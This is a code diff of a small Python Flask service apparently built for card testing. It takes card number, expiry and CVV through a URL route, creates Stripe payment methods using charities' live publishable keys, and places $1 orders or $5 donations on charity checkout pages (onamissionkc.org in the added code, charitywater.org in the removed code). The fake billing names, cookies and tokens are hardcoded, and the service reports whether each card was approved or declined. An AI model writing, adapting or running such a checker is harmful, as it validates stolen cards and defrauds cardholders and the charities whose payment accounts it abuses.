@@ -1,186 +1,129 @@
+from flask import Flask, request, jsonify
 import requests
-import random
-import string
-import json
-import logging
-from flask import Flask, jsonify, request
-from urllib.parse import unquote
 
 app = Flask(__name__)
 
-# Configure logging
-logging.basicConfig(level=logging.INFO)
-logger = logging.getLogger(__name__)
-
-def generate_random_string(length=10):
-    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
-
-def process_credit_card(cc_input):
-    parts = cc_input.split('|')
-    if len(parts) != 4:
-        raise ValueError("Invalid CC input format. Expected CC|MM|YYYY|CVV")
-    
-    return {
-        'number': parts[0].strip(),
-        'exp_month': parts[1].strip(),
-        'exp_year': parts[2].strip()[-2:], 
-        'cvc': parts[3].strip()
-    }
-
-def make_donation(cc_input, email, name, amount=5):
-    try:
-        card_details = process_credit_card(cc_input)
-    except ValueError as e:
-        return {"status": "declined", "message": str(e)}
-    
-    # Generate fresh session identifiers
-    muid = f"{generate_random_string(8)}-{generate_random_string(4)}-{generate_random_string(4)}-{generate_random_string(4)}-{generate_random_string(12)}"
-    guid = generate_random_string(32)
-    sid = generate_random_string(32)
-    
-    stripe_headers = {
+def process_payment(ccn, mm, yy, cvc):
+    if len(yy) == 2:
+        yy = '20' + yy
+    headers = {
+        'authority': 'api.stripe.com',
         'accept': 'application/json',
-        'accept-language': 'en-US,en;q=0.9',
+        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
         'content-type': 'application/x-www-form-urlencoded',
         'origin': 'https://js.stripe.com',
-        'priority': 'u=1, i',
         'referer': 'https://js.stripe.com/',
-        'sec-ch-ua': '"Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Windows"',
+        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
+        'sec-ch-ua-mobile': '?1',
+        'sec-ch-ua-platform': '"Android"',
         'sec-fetch-dest': 'empty',
         'sec-fetch-mode': 'cors',
         'sec-fetch-site': 'same-site',
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
+        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
     }
-
-    stripe_data = {
-        'type': 'card',
-        'billing_details[address][postal_code]': '91003',
-        'billing_details[address][city]': 'New York',
-        'billing_details[address][country]': 'US',
-        'billing_details[address][line1]': 'New York',
-        'billing_details[email]': email,
-        'billing_details[name]': name,
-        'card[number]': card_details['number'],
-        'card[cvc]': card_details['cvc'],
-        'card[exp_month]': card_details['exp_month'],
-        'card[exp_year]': card_details['exp_year'],
-        'guid': guid,
-        'muid': muid,
-        'sid': sid,
-        'pasted_fields': 'number',
-        'payment_user_agent': 'stripe.js/f5ddf352d5; stripe-js-v3/f5ddf352d5; card-element',
-        'referrer': 'https://www.charitywater.org',
-        'time_on_page': str(random.randint(700000, 800000)),
-        'key': 'pk_live_51049Hm4QFaGycgRKOIbupRw7rf65FJESmPqWZk9Jtpf2YCvxnjMAFX7dOPAgoxv9M2wwhi5OwFBx1EzuoTxNzLJD00ViBbMvkQ',
+    data = f'billing_details[address][city]=Oakford&billing_details[address][country]=US&billing_details[address][line1]=Siles+Avenue&billing_details[address][line2]=&billing_details[address][postal_code]=19053&billing_details[address][state]=PA&billing_details[name]=Geroge+Washintonne&billing_details[email]=grogeh%40gmail.com&type=card&card[number]={ccn}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&payment_user_agent=stripe.js%2F5445b56991%3B+stripe-js-v3%2F5445b56991%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fwww.onamissionkc.org&time_on_page=145592&client_attribution_metadata[client_session_id]=22e7d0ec-db3e-4724-98d2-a1985fc4472a&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]=7904f40e-9588-48b2-bc6b-fb88e0ef71d5&guid=18f2ab46-3a90-48da-9a6e-2db7d67a3b1de3eadd&muid=3c19adce-ab63-41bc-a086-f6840cd1cb6d361f48&sid=9d45db81-2d1e-436a-b832-acc8b6abac4814eb67&key=pk_live_51LwocDFHMGxIu0Ep6mkR59xgelMzyuFAnVQNjVXgygtn8KWHs9afEIcCogfam0Pq6S5ADG2iLaXb1L69MINGdzuO00gFUK9D0e&_stripe_account=acct_1LwocDFHMGxIu0Ep'
+    response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
+    apx = response.json()
+    if 'id' not in apx:
+        return f"Error: {apx.get('error', {}).get('message', 'Unknown error')}"
+    pid = apx["id"]
+    cookies = {
+        'crumb': 'BZuPjds1rcltODIxYmZiMzc3OGI0YjkyMDM0YzZhM2RlNDI1MWE1',
+        'ss_cvr': 'b5544939-8b08-4377-bd39-dfc7822c1376|1760724937850|1760724937850|1760724937850|1',
+        'ss_cvt': '1760724937850',
+        '__stripe_mid': '3c19adce-ab63-41bc-a086-f6840cd1cb6d361f48',
+        '__stripe_sid': '9d45db81-2d1e-436a-b832-acc8b6abac4814eb67',
     }
+    headers = {
+        'authority': 'www.onamissionkc.org',
+        'accept': 'application/json, text/plain, */*',
+        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
+        'content-type': 'application/json',
+        'origin': 'https://www.onamissionkc.org',
+        'referer': 'https://www.onamissionkc.org/checkout?cartToken=OBEUbArW4L_xPlSD9oXFJrWCGoeyrxzx4MluNUza',
+        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
+        'sec-ch-ua-mobile': '?1',
+        'sec-ch-ua-platform': '"Android"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-origin',
+        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
+        'x-csrf-token': 'BZuPjds1rcltODIxYmZiMzc3OGI0YjkyMDM0YzZhM2RlNDI1MWE1',
+    }
+    json_data = {
+        'email': 'grogeh@gmail.com',
+        'subscribeToList': False,
+        'shippingAddress': {
+            'id': '',
+            'firstName': '',
+            'lastName': '',
+            'line1': '',
+            'line2': '',
+            'city': '',
+            'region': 'NY',
+            'postalCode': '',
+            'country': '',
+            'phoneNumber': '',
+        },
+        'createNewUser': False,
+        'newUserPassword': None,
+        'saveShippingAddress': False,
+        'makeDefaultShippingAddress': False,
+        'customFormData': None,
+        'shippingAddressId': None,
+        'proposedAmountDue': {
+            'decimalValue': '1',
+            'currencyCode': 'USD',
+        },
+        'cartToken': 'OBEUbArW4L_xPlSD9oXFJrWCGoeyrxzx4MluNUza',
+        'paymentToken': {
+            'stripePaymentTokenType': 'PAYMENT_METHOD_ID',
+            'token': pid,
+            'type': 'STRIPE',
+        },
+        'billToShippingAddress': False,
+        'billingAddress': {
+            'id': '',
+            'firstName': 'Davide',
+            'lastName': 'Washintonne',
+            'line1': 'Siles Avenue',
+            'line2': '',
+            'city': 'Oakford',
+            'region': 'PA',
+            'postalCode': '19053',
+            'country': 'US',
+            'phoneNumber': '+1361643646',
+        },
+        'savePaymentInfo': False,
+        'makeDefaultPayment': False,
+        'paymentCardId': None,
+        'universalPaymentElementEnabled': True,
+    }
+    response1 = requests.post('https://www.onamissionkc.org/api/2/commerce/orders', cookies=cookies, headers=headers, json=json_data)
+    apx1 = response1.json()
+    if "failureType" in apx1:
+        return f"{ccn}|{mm}|{yy}|{cvc} --> {apx1['failureType']}"
+    else:
+        return f"{ccn}|{mm}|{yy}|{cvc} --> PAYMENT_SUCCESS"
 
-    try:
-        stripe_response = requests.post(
-            'https://api.stripe.com/v1/payment_methods',
-            headers=stripe_headers,
-            data=stripe_data
-        )
-        
-        if stripe_response.status_code != 200:
-            try:
-                error_data = stripe_response.json()
-                error_message = error_data.get('error', {}).get('message', 'Stripe payment method creation failed')
-                return {"status": "declined", "message": error_message}
-            except:
-                return {"status": "declined", "message": "Stripe payment method creation failed"}
-        
-        payment_method = stripe_response.json()
-        payment_method_id = payment_method.get('id')
-        
-        if not payment_method_id:
-            return {"status": "declined", "message": "Could not get payment method ID from Stripe"}
-       
-        donation_headers = {
-            'accept': '*/*',
-            'accept-language': 'en-US,en;q=0.9',
-            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-            'origin': 'https://www.charitywater.org',
-            'priority': 'u=1, i',
-            'referer': 'https://www.charitywater.org/',
-            'sec-ch-ua': '"Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"',
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-platform': '"Windows"',
-            'sec-fetch-dest': 'empty',
-            'sec-fetch-mode': 'cors',
-            'sec-fetch-site': 'same-origin',
-            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
-            'x-requested-with': 'XMLHttpRequest',
-        }
+@app.route('/gateway=stripe5$/key=rocky/cc=<card_details>', methods=['GET'])
+def payment_gateway():
+    card_input = request.args.get('card_details', '')
+    parts = card_input.split('|')
+    if len(parts) != 4:
+        return jsonify({"status": "error", "response": "Invalid card format: cc|mm|yy|cvv"}), 400
+    
+    ccn, mm, yy, cvc = parts
+    result = process_payment(ccn, mm, yy, cvc)
+    
+    if "PAYMENT_SUCCESS" in result:
+        status = "approved"
+    elif "DECLINED" in result.upper():
+        status = "declined"
+    else:
+        status = "error"
+    
+    return jsonify({"status": status, "response": result})
 
-        donation_data = {
-            'country': 'us',
-            'payment_intent[email]': email,
-            'payment_intent[amount]': str(amount),
-            'payment_intent[currency]': 'usd',
-            'payment_intent[payment_method]': payment_method_id,
-            'disable_existing_subscription_check': 'false',
-            'donation_form[amount]': str(amount),
-            'donation_form[comment]': '',
-            'donation_form[display_name]': '',
-            'donation_form[email]': email,
-            'donation_form[name]': name.split()[0] if ' ' in name else name,
-            'donation_form[payment_gateway_token]': '',
-            'donation_form[payment_monthly_subscription]': 'false',
-            'donation_form[surname]': name.split()[1] if ' ' in name else '',
-            'donation_form[campaign_id]': 'a5826748-d59d-4f86-a042-1e4c030720d5',
-            'donation_form[setup_intent_id]': '',
-            'donation_form[subscription_period]': '',
-            'donation_form[metadata][email_consent_granted]': 'true',
-            'donation_form[metadata][full_donate_page_url]': 'https://www.charitywater.org/',
-            'donation_form[metadata][phone_number]': '',
-            'donation_form[metadata][plaid_account_id]': '',
-            'donation_form[metadata][plaid_public_token]': '',
-            'donation_form[metadata][uk_eu_ip]': 'false',
-            'donation_form[metadata][with_saved_payment]': 'false',
-            'donation_form[address][address_line_1]': 'New York',
-            'donation_form[address][address_line_2]': '',
-            'donation_form[address][city]': 'New York',
-            'donation_form[address][country]': '',
-            'donation_form[address][zip]': '91003',
-        }
-
-        donation_response = requests.post(
-            'https://www.charitywater.org/donate/stripe',
-            headers=donation_headers,
-            data=donation_data
-        )
-        
-        if donation_response.status_code == 200:
-            return {"status": "charged", "message": "Donation successful"}
-        else:
-            try:
-                response_data = donation_response.json()
-                error_message = response_data.get('error', {}).get('message', 'Donation submission failed')
-                return {"status": "declined", "message": error_message}
-            except json.JSONDecodeError:
-                return {"status": "declined", "message": "Donation submission failed"}
-            
-    except Exception as e:
-        return {"status": "declined", "message": f"An error occurred: {str(e)}"}
-
-@app.route('/gateway=stripe5$/key=rocky/cc=<cc>', methods=['GET'])
-def handle_donation(cc):
-    try:
-        # Decode the cc parameter to handle URL-encoded characters
-        decoded_cc = unquote(cc)
-        logger.info(f"Received request with cc: {decoded_cc}")
-        result = make_donation(decoded_cc, "darkboy3366@gmail.com", "Dark Boy")
-        return jsonify(result)
-    except Exception as e:
-        logger.error(f"Server error: {str(e)}")
-        return jsonify({"status": "declined", "message": f"Server error: {str(e)}"}), 500
-
-@app.errorhandler(404)
-def page_not_found(e):
-    logger.warning(f"404 error: {str(e)}")
-    return jsonify({"status": "declined", "message": "Invalid endpoint or parameters"}), 404
-
-if __name__ == '__main__':
+if __name__ == "__main__":
     app.run(debug=True)
